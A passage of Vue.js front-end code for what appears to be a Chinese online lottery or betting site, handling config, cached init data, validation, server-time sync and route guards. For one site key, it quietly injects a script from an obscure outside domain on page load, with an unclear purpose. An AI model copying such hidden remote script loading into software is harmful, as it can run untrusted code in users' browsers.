    })()
    return json;
  },
  SaveInitData(d){
    store.commit('SaveInitData', d)
  },
  WatchInitData(d) {
    //必须跟随执行的函数
    var head = document.getElementsByTagName('head')[0]
    var v
    for(var i in d) {
      switch(i){
        case 'SiteConfig':
          ;(function(s){
            console.log(s);
            routes[1].meta.title=`<img src="${state.constant.ImgHost+s.MobileLogo}">`
            if (!_App) {
              document.title=s.Name
              // routes[2].meta.title=routes[1].meta.title
            }
            document.title = s.Name
            if(!s.PCLogo){//PCLogo为空时转换
              s.PCLogo={}
              s.PCLogo.logo1=''
            }
            var site = s.PCLogo.logo1
            if (site) {
              site=site.split('/')[1]
              window.site=site
              switch(site){
                case 'huifa':
                  var scriptTag = document.createElement('script')
                  scriptTag.src='//m.badzzducom2.shop3721.com/yunbd.php?tk=60b6ef7bef953ce499b6b5f85c409962'
                  head.appendChild(scriptTag)
                break
              }
            }
          })(d.SiteConfig)
        break
      }
    }
  },
  AjaxGetInitData(arr,fun){
    state.needVerify=0
    sessionStorage.setItem("needVerify",state.needVerify)
    var ajax = {
      Action:"GetInitData",
      Requirement:arr
    }
    if (_App&&!state.UserName) {
      //app未登录的时候将部分项目移出版本校验
      ajax.CacheData=Object.assign(CacheData)
      for (var i = AppArr.length - 1; i >= 0; i--) {
        delete ajax.CacheData[AppArr[i]]
      }
      delete ajax.CacheData.LotteryConfig
      delete ajax.CacheData.LotteryList
    }else{
      ajax.CacheData=CacheData
    }
    _fetch(ajax).then((json)=>{
      if (json.Code===1||json.Code===0) {
        fun&&fun(state)
      }else{
        layer.msgWarn(json.StrCode);
      }
    })
  },
  GetInitData(arr,fun){
    state.UserName&&arr.push("UserUpGradeBonus")
    console.log(arr);
    var newArr=[];
    for (var i = arr.length - 1; i >= 0; i--) {
      switch(arr[i]){
        //以下是每次都需要更新请求的
        case "UserBalance":
        case "UserWithdrawAvail":
        // case "PayLimit":
        case "WithdrawRemainTimes":
        case "UserGradeGrow":
        case "UserBankCardList":
          newArr.push(arr[i])
        break
        default:
          if (state[arr[i]]==null) {
            newArr.push(arr[i])
          }else if(LocalCacheArr.indexOf(arr[i])>-1){
            var time = _Tool.Date.getTime()
            var todayms = time%DAY_TIME - GMT_DIF   //当天的毫秒值
            time/=DAY_TIME
            time=Math.floor(time)%366
            if (LocalCacheData[arr[i]]!=time) {
              console.log(arr[i]+"过期");
              //每天0点20分更新
              if (todayms%DAY_TIME > 20 * 60 * 1000) {
                console.log(arr[i]+"更新");
                newArr.push(arr[i])
              }
            }else{
              console.log(arr[i]+"没过期");
            }
          }
      }
    }
    if (!newArr.length) {
      // console.log("全部都有");
      fun&&fun(state)
      return;
    }
    this.AjaxGetInitData(newArr,fun)
  },
  //保证校验时按顺序来
  format:function(obj, order, cfg){
    cfg = cfg || {}
    var f,v

    for(var i = 0;i < order.length;i++){
      var k = order[i];
      v = obj[k]
      f=cfg[k]||store.state._FomatConfig[k]

      // 如果是校验重复的
      if(k.indexOf('check') > -1){
        var target = k.slice(5), target_f = cfg[target] || store.state._FomatConfig[target]
        if(obj[k] !== obj[target]){
          console.log(obj[k], obj[target])
          return [k, `两次${target_f.Name} 不相同`]
        }
      }

      if (f) {
        if (!f.Reg.test(v)) {
          return [k,v?f.ErrMsg:(f.Name+"不能为空")];
        }
      }
    }

    return false;
  },
  getServerTime: (function(){
    var cantGetTime = 0,
        timeItemList = []
    return function(fun){
      var timeBegin = new Date().getTime()
      _fetch({Action: "GetServerTimeMillisecond"}).then((json)=>{
        var timeEnd = new Date().getTime()
        var interval = timeEnd - timeBegin
        var timeReg = /^\d{13}$/

        if(json.Code > -1 && timeReg.test(json.Data)){
          timeItemList.push(new TimeItem(interval, timeEnd, timeBegin, json.Data))
        }
        if(cantGetTime > 4){
          var noTimeGeted = timeItemList.every(timeItem=>!timeItem.SerTime)  //一次都没获取到数据
          if(noTimeGeted){
            var Difftime=0
            try{
              Difftime=(new Date().getTimezoneOffset()+480)*60
            }catch(e){
              layer.msgWarn('不支持getTimezoneOffset')
            }
            store.commit('setTmpDifftime', Difftime)
            layer.msgWarn('因无法同步服务器时间,您可能无法正常投注')
            cantGetTime = 0
            timeItemList = []
            fun && fun()

            // layer.url("因无法同步服务器时间,您将无法投注,请检查网络情况", '/index')
          }else{
            //有一些获取到了数据，但是超时了。从获取到的再择优
            store.commit('setDifftime', timeItemList)
            cantGetTime = 0
            timeItemList = []
            fun && fun()
          }

        }else{
          if(interval > 1000){
            cantGetTime++
            this.getServerTime(fun)
          }else{
            if(json.Code === 1) {
              if(!json.Data){
                cantGetTime++;
                this.getServerTime(fun);
              }else {
                store.commit('setDifftime', timeItemList)
                fun && fun()
                cantGetTime = 0
                timeItemList = []
              }
            }else{
              cantGetTime++;
              this.getServerTime(fun);
            }
          }
        }
      })
    }
  })(),
  beforEnter:function(to){
    var meta = to.matched[0].meta
    if(meta.user){
      if (!state.UserName) {
        state.login2path = to.path
        router.replace("/login")
      }else if(state.agent){
        state.AgentRebate||router.replace("/notfount")
      }
    }
    if (meta.verify) {
      var fy = meta.verify===1?1:state[meta.verify]
      if (to.path==="/setSafePwd") {fy*=1}
      if (fy&&(!state.UserVerify||meta.from.search(state.UserVerify)==-1)
      ) {
        console.log("条件不足");
        router.go(-1)
      }
    }
  },
}
RootApp.WatchInitData(localState)
window.RootApp = new Vue({
  el: '#app',
  store,
  router,
  methods:window.RootApp,
  created:function(){
    var len = routes.length
    // var ToPath=localStorage.getItem('LastPath')
    // if(ToPath){
    //   router.push(ToPath)
    // }
    // var ToPath = (ToPath||location.pathname).toLowerCase()
    var ToPath = location.pathname.toLowerCase()
    if (ToPath==="/") {return}
    for (var i = 0; i < len; i++) {
      var actualPath = routes[i].path.toLowerCase().split('/')[1]  //去掉斜杠的第一个
      if (actualPath && ToPath.indexOf(actualPath) > -1) {
        this.beforEnter({ matched: [routes[i]] })
        break
      }
      // if (ToPath.search(routes[i].path.toLowerCase())>-1&&routes[i].path!='/') {
      //   this.beforEnter({matched:[routes[i]]})
      //   break
      // }
    }
  },
  render: h => h(App),
});

router.beforeEach((to, from, next) => {
  //不在scrollBehavior中设置，改为自己操控。来避免全部彩种进入时，被归位的问题
  if(to.name != '彩种'){
    document.body.scrollTop = 0
  }
  if(state.UserName&&state.UserName!==localStorage.getItem('UserName')){
    setState(UserArr)
  }
  state.turning=true
  RootApp.beforEnter(to)
  next();
});

router.afterEach((to, from) => {
  state.turning=false
  layer.closeAll()
  state.needVerify++
  sessionStorage.setItem("needVerify",state.needVerify)
});

//全局指令
Vue.directive('copyBtn', {
  bind: function(el, binding, vnode){
    el.addEventListener('click', function(){
      var siblings= Array.prototype.filter.call(el.parentNode.children, function(child){ return child !== el; });
      var targetInput = siblings[0];
      targetInput.select()
      document.execCommand('copy')
    })
  }
})

//如果检测到copy事件
document.addEventListener('copy', function(e){
  var el = e.target
  var btn = [].filter.call(el.parentNode.children, child=>(child !== el))[0]
  if(btn.className.indexOf('copy') > -1){
    layer.msgWarn('已将内容复制到剪切板')
  }
})
